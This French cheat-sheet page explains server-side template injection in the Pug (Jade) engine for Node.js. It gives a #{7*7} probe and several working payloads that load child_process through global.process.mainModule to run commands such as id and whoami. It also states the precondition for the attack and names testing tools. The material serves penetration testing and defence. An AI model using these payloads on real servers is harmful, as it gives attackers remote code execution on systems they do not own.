---
title: "Injection de template côté serveur Pug"
description: "Exploiter la SSTI Pug (Jade) dans Node.js : confirmation avec #{7*7}, et exécution de JavaScript inline via l'interpolation et le code bufferisé vers require('child_process')."
keywords:
  - SSTI Pug
  - injection de template Jade
  - code bufferisé
  - require child_process
  - global process
---

# Pug

Pug (anciennement Jade) compile les templates en fonctions JavaScript, et plusieurs de ses constructions acceptent des expressions JavaScript inline, de sorte qu'une injection dans la source du template est proche d'une exécution de code directe. Confirmez avec `#{7*7}` affichant `49`.

L'interpolation évalue n'importe quelle expression JavaScript, donc un one-liner charge `child_process` et exécute une commande :

```pug
#{global.process.mainModule.require('child_process').execSync('id')}
```

`global.process.mainModule.require` atteint le véritable `require` depuis l'intérieur de la portée du template, évitant de dépendre d'un binding `require` local. Les lignes de code bufferisé (`=`) et de code non bufferisé (`-`) de Pug exécutent des instructions directement, donnant une forme multiligne plus propre :

```pug
- var x = global.process.mainModule.require('child_process')
= x.execSync('whoami').toString()
```

Lorsque l'entrée est injectée en milieu d'attribut ou de ligne plutôt que comme template complet, entrez d'abord dans un contexte d'expression. Un schéma courant échappe une interpolation et ajoute le payload :

```pug
= 7*7
#{function(){localLoad=global.process.mainModule.constructor._load; return localLoad('child_process').execSync('id').toString()}()}
```

La précondition est la même que pour les autres moteurs Node : la valeur non fiable doit atteindre `pug.compile`/`pug.render` comme source de template (ou y être concaténée), et non simplement être passée comme valeur de locals, laquelle est traitée comme donnée. Confirmez avec `#{7*7}` ; une fois l'arithmétique évaluée, le payload `global.process.mainModule.require('child_process')` est une RCE immédiate car Pug n'applique aucun sandbox au JavaScript inline.

## Outils

- tplmap, SSTImap

## Références

- Documentation Pug : interpolation, code bufferisé et non bufferisé
- PortSwigger Web Security Academy: Server-side template injection
